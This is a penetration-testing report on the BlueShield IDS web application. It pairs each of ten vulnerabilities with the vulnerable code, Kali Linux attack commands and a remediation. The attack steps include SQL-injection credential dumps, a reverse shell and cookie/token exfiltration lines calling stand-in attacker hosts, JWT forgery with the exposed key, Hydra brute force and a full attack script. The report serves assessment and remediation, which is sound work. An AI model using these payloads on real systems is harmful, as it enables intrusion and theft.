# 🛡️ BlueShield IDS — Penetration Testing & Vulnerability Assessment Report

> **Project:** BlueShield Intrusion Detection System  
> **Assessment Type:** Web Application Penetration Testing (Grey Box)  
> **Tools Used:** Kali Linux, Burp Suite, SQLMap, cURL, Hydra, Nikto  
> **Date:** May 2026  
> **Tester:** [Your Name]  
> **Risk Level:** 🔴 CRITICAL

---

## 📋 Executive Summary

A comprehensive security assessment was conducted against the BlueShield IDS web application. The application is built with **FastAPI (Python)** backend and **React (Vite)** frontend. **10 vulnerabilities** were identified ranging from Critical to Low severity.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 3 |
| 🟠 High | 3 |
| 🟡 Medium | 3 |
| 🔵 Low | 1 |

---

## Vulnerability Summary Table

| # | Vulnerability | OWASP Top 10 | CWE | CVSS | File |
|---|-------------|-------------|-----|------|------|
| 1 | SQL Injection | A03:2021 – Injection | CWE-89 | 9.8 | `routers/tools.py` |
| 2 | OS Command Injection | A03:2021 – Injection | CWE-78 | 9.8 | `routers/tools.py` |
| 3 | Hardcoded Secret Key | A02:2021 – Crypto Failures | CWE-798 | 9.1 | `auth_utils.py` |
| 4 | Broken Access Control (Missing Auth) | A01:2021 – Broken Access Control | CWE-306 | 8.6 | `routers/alerts.py` |
| 5 | IDOR (Insecure Direct Object Ref) | A01:2021 – Broken Access Control | CWE-639 | 7.5 | `routers/alerts.py` |
| 6 | Reflected XSS via API | A03:2021 – Injection | CWE-79 | 6.1 | `routers/tools.py` |
| 7 | Weak Password Policy | A07:2021 – Auth Failures | CWE-521 | 5.3 | `routers/auth.py` |
| 8 | JWT Misconfiguration | A02:2021 – Crypto Failures | CWE-347 | 5.9 | `auth_utils.py` |
| 9 | Verbose Error Disclosure | A05:2021 – Security Misconfig | CWE-209 | 4.3 | `routers/pcap.py, tools.py` |
| 10 | Insecure Token Storage (Frontend) | A04:2021 – Insecure Design | CWE-922 | 3.7 | `AuthContext.jsx` |

---

## 🔴 VULN-01: SQL Injection (Critical)

### Description
The `/api/tools/search` endpoint constructs SQL queries using **raw string interpolation** with unsanitized user input, allowing full database extraction.

### Vulnerable Code
**File:** `backend/routers/tools.py` — Line 20
```python
sql = f"SELECT * FROM traffic_events WHERE src_ip = '{query}' OR attack_type = '{query}' LIMIT 10"
result = db.execute(text(sql))
```

### Attack Steps (Kali Linux)

**Step 1 — Detect the injection point:**
```bash
# Basic test — returns all rows (LIMIT 10)
curl "http://<TARGET>:8000/api/tools/search?query=' OR '1'='1"
```

**Step 2 — Extract database tables using UNION-based injection:**
```bash
# SQLite — enumerate tables
curl "http://<TARGET>:8000/api/tools/search?query=' UNION SELECT 1,2,3,name,5,6,7,8,9,10,11,12 FROM sqlite_master WHERE type='table' --"
```

**Step 3 — Extract user credentials:**
```bash
# Dump usernames and hashed passwords
curl "http://<TARGET>:8000/api/tools/search?query=' UNION SELECT 1,2,username,email,hashed_password,6,7,8,9,10,11,12 FROM users --"
```

**Step 4 — Automated exploitation with SQLMap:**
```bash
sqlmap -u "http://<TARGET>:8000/api/tools/search?query=test" \
  --dbms=sqlite \
  --dump \
  --batch \
  --level=3 \
  --risk=3
```

**Step 5 — Dump specific tables:**
```bash
sqlmap -u "http://<TARGET>:8000/api/tools/search?query=test" \
  -T users --dump --batch
```

### Defence Recommendation

**Use parameterized queries with SQLAlchemy ORM:**

```python
# ✅ SECURE — Parameterized query
@router.get("/search")
def search_secure(query: str = Query(...), db: Session = Depends(get_db)):
    results = db.query(TrafficEvent).filter(
        (TrafficEvent.src_ip == query) | (TrafficEvent.attack_type == query)
    ).limit(10).all()

    return [
        {
            "id": r.id,
            "timestamp": r.timestamp.isoformat() if r.timestamp else None,
            "src_ip": r.src_ip,
            "dst_ip": r.dst_ip,
            "attack_type": r.attack_type,
            "severity": r.severity,
            "status": "Blocked" if r.blocked else "Flagged"
        }
        for r in results
    ]
```

---

## 🔴 VULN-02: OS Command Injection (Critical)

### Description
The `/api/tools/ping` endpoint passes user input directly to a system shell via `subprocess.Popen(shell=True)`, allowing arbitrary command execution on the server.

### Vulnerable Code
**File:** `backend/routers/tools.py` — Lines 50-54
```python
cmd = f"ping -c 1 {host}"
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
```

### Attack Steps (Kali Linux)

**Step 1 — Basic command chaining:**
```bash
# Read /etc/passwd
curl "http://<TARGET>:8000/api/tools/ping?host=127.0.0.1;cat /etc/passwd"
```

**Step 2 — Reverse shell:**
```bash
# Attacker machine — start listener
nc -lvnp 4444

# Payload (URL-encoded)
curl "http://<TARGET>:8000/api/tools/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261"
```

**Step 3 — Data exfiltration:**
```bash
# List files on the server
curl "http://<TARGET>:8000/api/tools/ping?host=127.0.0.1;ls -la /app/"

# Read the database file
curl "http://<TARGET>:8000/api/tools/ping?host=127.0.0.1;cat /app/backend/blueshield.db | base64"

# Read environment variables / secrets
curl "http://<TARGET>:8000/api/tools/ping?host=127.0.0.1;env"
```

**Step 4 — Using Commix (automated tool on Kali):**
```bash
commix --url="http://<TARGET>:8000/api/tools/ping?host=127.0.0.1" \
  --technique=classic \
  --batch
```

### Defence Recommendation

```python
import re
import subprocess

@router.get("/ping")
def ping_secure(host: str = Query(...)):
    # ✅ Whitelist: only allow valid IP or hostname
    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,253}[a-zA-Z0-9]$'
    if not re.match(pattern, host):
        raise HTTPException(status_code=400, detail="Invalid hostname format")

    # ✅ Use subprocess with list args (no shell=True)
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "3", host],
            capture_output=True,
            text=True,
            timeout=10
        )
        return {"stdout": result.stdout, "stderr": result.stderr}
    except subprocess.TimeoutExpired:
        return {"error": "Ping timed out"}
```

---

## 🔴 VULN-03: Hardcoded Secret Key (Critical)

### Description
The JWT secret key is hardcoded in source code, meaning anyone with access to the repo (public or leaked) can forge valid admin tokens.

### Vulnerable Code
**File:** `backend/auth_utils.py` — Line 7
```python
SECRET_KEY = "super_secret_blueshield_key_for_demo_purposes_only"
```

### Attack Steps (Kali Linux)

**Step 1 — Forge an admin JWT token using Python:**
```bash
pip install python-jose
python3 -c "
from jose import jwt
from datetime import datetime, timedelta

token = jwt.encode(
    {'sub': 'admin', 'role': 'Admin', 'exp': datetime.utcnow() + timedelta(hours=24)},
    'super_secret_blueshield_key_for_demo_purposes_only',
    algorithm='HS256'
)
print(token)
"
```

**Step 2 — Use the forged token to access admin endpoints:**
```bash
TOKEN="<paste_forged_token>"
curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:8000/api/admin/users
curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:8000/api/admin/stats
curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:8000/api/admin/logs/login
```

### Defence Recommendation

```python
import os
import secrets

# ✅ Load from environment variable, generate if missing
SECRET_KEY = os.environ.get("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("JWT_SECRET_KEY environment variable is not set!")

ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
```

```bash
# Generate a strong key and set it in .env
export JWT_SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
```

---

## 🟠 VULN-04: Broken Access Control — Missing Authentication (High)

### Description
Critical endpoints like `/api/alerts`, `/api/dashboard/*`, `/api/live-traffic/*`, and `/api/tools/*` have **no authentication** middleware. Any unauthenticated user can read all alerts, dashboard data, and execute tools.

### Vulnerable Code
**File:** `routers/alerts.py` — No `Depends(get_current_user)`
```python
@router.get("")
def get_all_alerts(db: Session = Depends(get_db)):  # ❌ No auth!
    alerts = db.query(Alert).order_by(Alert.timestamp.desc()).all()
```

**File:** `routers/tools.py` — Both `/search` and `/ping` have no auth.

### Attack Steps (Kali Linux)

```bash
# No token needed — full access to everything
curl http://<TARGET>:8000/api/alerts
curl http://<TARGET>:8000/api/dashboard/stats
curl http://<TARGET>:8000/api/dashboard/recent-alerts
curl http://<TARGET>:8000/api/live-traffic/stream
curl http://<TARGET>:8000/api/models/compare

# Resolve any alert without auth
curl -X PATCH http://<TARGET>:8000/api/alerts/1/resolve

# Block any IP without auth
curl -X POST http://<TARGET>:8000/api/alerts/1/block
```

### Defence Recommendation

```python
from ..dependencies import get_current_active_user

@router.get("")
def get_all_alerts(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_active_user)  # ✅ Auth required
):
    alerts = db.query(Alert).order_by(Alert.timestamp.desc()).all()
    ...

@router.patch("/{alert_id}/resolve")
def resolve_alert(
    alert_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_active_user)  # ✅
):
    ...
```

---

## 🟠 VULN-05: IDOR — Insecure Direct Object Reference (High)

### Description
The `/api/alerts/{alert_id}/resolve` and `/api/alerts/{alert_id}/block` endpoints accept any integer ID without verifying ownership or authorization. An attacker can manipulate sequential IDs to resolve or block alerts belonging to other users.

### Attack Steps (Kali Linux)

```bash
# Enumerate all alert IDs and resolve them
for i in $(seq 1 100); do
  curl -s -X PATCH "http://<TARGET>:8000/api/alerts/$i/resolve" &
done

# Block IPs associated with arbitrary alerts
for i in $(seq 1 50); do
  curl -s -X POST "http://<TARGET>:8000/api/alerts/$i/block"
done
```

**With Burp Suite Intruder:**
1. Capture a `PATCH /api/alerts/1/resolve` request
2. Set `1` as the payload position
3. Use Numbers payload from 1 to 1000
4. Check responses for `{"status": "success"}`

### Defence Recommendation

```python
@router.patch("/{alert_id}/resolve")
def resolve_alert(
    alert_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_active_user)  # ✅ Auth
):
    alert = db.query(Alert).filter(Alert.id == alert_id).first()
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")

    # ✅ Use UUIDs instead of sequential IDs
    # ✅ Log the action for audit trail
    log_action(current_user.id, "resolve_alert", alert_id)
    alert.resolved = True
    db.commit()
```

---

## 🟠 VULN-06: Reflected XSS via API Error Messages (High)

### Description
The `/api/tools/search` endpoint returns raw error messages that include the user's input. If the frontend renders this without sanitization, it leads to XSS.

### Vulnerable Code
**File:** `routers/tools.py` — Line 37
```python
except Exception as e:
    return {"error": str(e)}  # ❌ Raw exception with user input reflected
```

**Frontend:** `ThreatHunter.jsx` renders `r.attack_type` and other fields directly.

### Attack Steps (Kali Linux / Browser)

**Step 1 — Inject XSS payload via search:**
```bash
# Payload that would execute if rendered as HTML
curl "http://<TARGET>:8000/api/tools/search?query=<script>alert('XSS')</script>"
```

**Step 2 — Cookie theft payload:**
```
http://<TARGET>:5173/threat-hunter
# Search for: <img src=x onerror="fetch('http://<ATTACKER>/steal?c='+document.cookie)">
```

**Step 3 — Use XSStrike (Kali):**
```bash
xsstrike -u "http://<TARGET>:8000/api/tools/search?query=test" --crawl
```

### Defence Recommendation

**Backend — Sanitize all outputs:**
```python
import html

except Exception as e:
    return {"error": html.escape(str(e))}  # ✅ Escape HTML entities
```

**Frontend — Never use `dangerouslySetInnerHTML`, always encode:**
```jsx
// React auto-escapes JSX by default — but ensure no raw HTML rendering
<td>{sanitize(r.attack_type)}</td>
```

**Add CSP Header (main.py):**
```python
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
```

---

## 🟡 VULN-07: Weak Password Policy (Medium)

### Description
The registration endpoint has **no password complexity requirements**. Users can register with passwords like "1", "a", or even an empty string.

### Vulnerable Code
**File:** `routers/auth.py` — Line 28
```python
password = user_data["password"]  # ❌ No validation at all
hashed_password = get_password_hash(password)
```

Also, the default admin password is `admin123` (in `seed_admin.py` line 32).

### Attack Steps (Kali Linux)

**Step 1 — Register with weak password:**
```bash
curl -X POST http://<TARGET>:8000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@h.com","password":"1"}'
```

**Step 2 — Brute force admin with Hydra:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <TARGET> http-post-form \
  "/api/auth/login:username=^USER^&password=^PASS^:Incorrect"
```

**Step 3 — Dictionary attack with common passwords:**
```bash
# Create a small targeted wordlist
echo -e "admin123\nadmin\npassword\n123456\nblueshield" > wordlist.txt

hydra -l admin -P wordlist.txt \
  <TARGET> http-post-form \
  "/api/auth/login:username=^USER^&password=^PASS^:Incorrect" -V
```

### Defence Recommendation

```python
import re

def validate_password(password: str):
    if len(password) < 12:
        raise HTTPException(400, "Password must be at least 12 characters")
    if not re.search(r'[A-Z]', password):
        raise HTTPException(400, "Password must contain uppercase letter")
    if not re.search(r'[a-z]', password):
        raise HTTPException(400, "Password must contain lowercase letter")
    if not re.search(r'[0-9]', password):
        raise HTTPException(400, "Password must contain a digit")
    if not re.search(r'[!@#$%^&*(),.?]', password):
        raise HTTPException(400, "Password must contain a special character")

@router.post("/register")
def register(user_data: dict, db: Session = Depends(get_db)):
    validate_password(user_data["password"])  # ✅
    ...
```

---

## 🟡 VULN-08: JWT Misconfiguration (Medium)

### Description
- No token **blacklist/revocation** mechanism — tokens remain valid after logout
- Token has **no `iss` (issuer) or `aud` (audience)** claims
- The `exp` fallback is only 15 minutes but the configured one is 30 min with no refresh token rotation

### Vulnerable Code
**File:** `auth_utils.py` — Lines 19-27
```python
def create_access_token(data: dict, expires_delta=None):
    to_encode = data.copy()
    to_encode.update({"exp": expire})  # ❌ No iss, aud, jti claims
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

### Attack Steps

**Step 1 — Token reuse after logout:**
```bash
# Login and get token
TOKEN=$(curl -s -X POST http://<TARGET>:8000/api/auth/login \
  -d "username=admin&password=admin123" | jq -r .access_token)

# Token still works even after "logout" (frontend only clears localStorage)
curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:8000/api/auth/me
# ✅ Still returns user data!
```

**Step 2 — Decode token contents (no encryption):**
```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
# Shows: {"sub": "admin", "role": "Admin", "exp": ...}
```

### Defence Recommendation

```python
import uuid

def create_access_token(data: dict, expires_delta=None):
    to_encode = data.copy()
    to_encode.update({
        "exp": expire,
        "iss": "blueshield-ids",      # ✅ Issuer
        "aud": "blueshield-frontend",  # ✅ Audience
        "jti": str(uuid.uuid4()),      # ✅ Unique token ID for revocation
        "iat": datetime.utcnow(),      # ✅ Issued at
    })
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

# ✅ Add a token blacklist (Redis or DB table)
# On logout: add jti to blacklist
# On verify: check if jti is blacklisted
```

---

## 🟡 VULN-09: Verbose Error / Information Disclosure (Medium)

### Description
Multiple endpoints leak internal error messages, stack traces, and system paths to the client.

### Vulnerable Code

**File:** `routers/pcap.py` — Line 136
```python
raise HTTPException(status_code=500, detail=f"Analysis failed: {str(e)}")
# ❌ Leaks internal paths, library versions, DB errors
```

**File:** `routers/tools.py` — Line 37
```python
return {"error": str(e)}  # ❌ Raw exception
```

### Attack Steps (Kali Linux)

```bash
# Trigger errors to gather internal info
curl "http://<TARGET>:8000/api/tools/search?query='"
# Returns: SQLite error with table schema info

curl -X POST http://<TARGET>:8000/api/pcap/upload \
  -F "file=@/dev/null;filename=test.pcap"
# Returns: internal path + library error

# Use Nikto for info disclosure scanning
nikto -h http://<TARGET>:8000
```

### Defence Recommendation

```python
import logging

logger = logging.getLogger(__name__)

@router.post("/upload")
async def upload_pcap(file: UploadFile, db: Session = Depends(get_db)):
    try:
        ...
    except Exception as e:
        logger.error(f"PCAP analysis failed: {str(e)}", exc_info=True)  # ✅ Log internally
        raise HTTPException(
            status_code=500,
            detail="Analysis failed. Please try again."  # ✅ Generic message
        )
```

---

## 🔵 VULN-10: Insecure Token Storage in localStorage (Low)

### Description
The JWT token is stored in `localStorage`, which is accessible to any JavaScript running on the page (including XSS payloads).

### Vulnerable Code
**File:** `frontend/src/context/AuthContext.jsx` — Lines 8, 50
```javascript
const [token, setToken] = useState(localStorage.getItem('token') || null);
localStorage.setItem('token', token);  // ❌ Accessible via XSS
```

### Attack Steps

```javascript
// If XSS is achieved, steal the token:
fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'));
```

### Defence Recommendation

Use **HttpOnly Secure Cookies** instead:

```python
# Backend — Set cookie on login
from fastapi.responses import JSONResponse

@router.post("/login")
def login(...):
    ...
    response = JSONResponse({"message": "Login successful"})
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,    # ✅ Not accessible via JS
        secure=True,      # ✅ HTTPS only
        samesite="Lax",   # ✅ CSRF protection
        max_age=1800
    )
    return response
```

---

## 🧪 Kali Linux Full Test Script

Save this as `pentest_blueshield.sh` and run on Kali:

```bash
#!/bin/bash
TARGET="http://<TARGET_IP>:8000"
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

echo "=========================================="
echo "  BlueShield IDS — Penetration Test Suite"
echo "=========================================="

echo -e "\n${RED}[TEST 1] SQL Injection${NC}"
curl -s "$TARGET/api/tools/search?query=' OR '1'='1" | head -c 500
echo ""

echo -e "\n${RED}[TEST 2] Command Injection${NC}"
curl -s "$TARGET/api/tools/ping?host=127.0.0.1;whoami"
echo ""

echo -e "\n${RED}[TEST 3] Unauthenticated Access${NC}"
curl -s "$TARGET/api/alerts" | head -c 300
echo ""

echo -e "\n${RED}[TEST 4] Dashboard without Auth${NC}"
curl -s "$TARGET/api/dashboard/stats"
echo ""

echo -e "\n${RED}[TEST 5] IDOR — Resolve Random Alert${NC}"
curl -s -X PATCH "$TARGET/api/alerts/1/resolve"
echo ""

echo -e "\n${RED}[TEST 6] Weak Registration${NC}"
curl -s -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"weakuser","email":"w@w.com","password":"1"}'
echo ""

echo -e "\n${RED}[TEST 7] Token Forging${NC}"
python3 -c "
from jose import jwt
from datetime import datetime, timedelta
t = jwt.encode({'sub':'admin','role':'Admin','exp':datetime.utcnow()+timedelta(hours=24)},
'super_secret_blueshield_key_for_demo_purposes_only','HS256')
print(t)
"
echo ""

echo -e "\n${RED}[TEST 8] Error Info Disclosure${NC}"
curl -s "$TARGET/api/tools/search?query='"
echo ""

echo -e "\n${GREEN}[DONE] All tests completed.${NC}"
```

---

## 📊 Risk Matrix Summary

```
CVSS Score   ███████████████████████  9.8  SQL Injection
CVSS Score   ███████████████████████  9.8  Command Injection
CVSS Score   ██████████████████████   9.1  Hardcoded Secret
CVSS Score   ████████████████████     8.6  Missing Auth
CVSS Score   ██████████████████       7.5  IDOR
CVSS Score   ██████████████           6.1  XSS
CVSS Score   █████████████            5.9  JWT Misconfig
CVSS Score   ████████████             5.3  Weak Passwords
CVSS Score   ██████████               4.3  Info Disclosure
CVSS Score   █████████                3.7  localStorage Token
```

---

## ✅ Remediation Priority

| Priority | Action | Effort |
|----------|--------|--------|
| 🔴 P0 | Fix SQL Injection → Use ORM queries | 1 hour |
| 🔴 P0 | Fix Command Injection → Use subprocess list | 1 hour |
| 🔴 P0 | Move SECRET_KEY to env variable | 30 min |
| 🟠 P1 | Add auth to all API endpoints | 2 hours |
| 🟠 P1 | Fix IDOR with ownership checks | 1 hour |
| 🟠 P1 | Add CSP headers for XSS protection | 30 min |
| 🟡 P2 | Implement password policy | 1 hour |
| 🟡 P2 | Add JWT claims (iss, aud, jti) | 1 hour |
| 🟡 P2 | Sanitize all error messages | 1 hour |
| 🔵 P3 | Migrate to HttpOnly cookies | 2 hours |
